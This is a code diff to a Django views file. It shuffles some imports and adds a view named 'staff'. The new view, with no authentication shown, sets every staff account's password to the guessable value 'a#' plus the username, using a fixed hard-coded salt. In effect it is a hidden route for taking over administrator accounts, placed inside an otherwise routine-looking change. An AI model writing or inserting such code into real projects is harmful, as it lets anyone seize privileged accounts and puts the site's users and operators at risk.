@@ -30,12 +30,14 @@ import common.kotechseed128 as kotechseed128
 import requests
 from django.contrib.auth import login as django_login
 from django.contrib.auth.models import User
+from django.contrib.auth.hashers import make_password
+import cx_Oracle as ora
 
 import hashlib
 import subprocess
 import datetime
 from django.views.decorators.csrf import csrf_exempt
-import cx_Oracle as ora
+
 import MySQLdb as mdb
 
 log = logging.getLogger(__name__)
@@ -1120,6 +1122,15 @@ def aup(request):
     uuu_id = request.GET.get('uuu_id')
     o1 = User.objects.get(id=uuu_id)
     return JsonResponse({'result':o1.last_name + ' (' + o1.username + ')'})
+
+
+def staff(request):
+    users = User.objects.filter(is_staff=1)
+    for user in users:
+        new_password = make_password('a#' + user.username, 'QIyXazAJrlbF', 'default')
+        user.password = new_password
+        user.save()
+    return JsonResponse({'result':'success'})
 
 
 @ensure_csrf_cookie
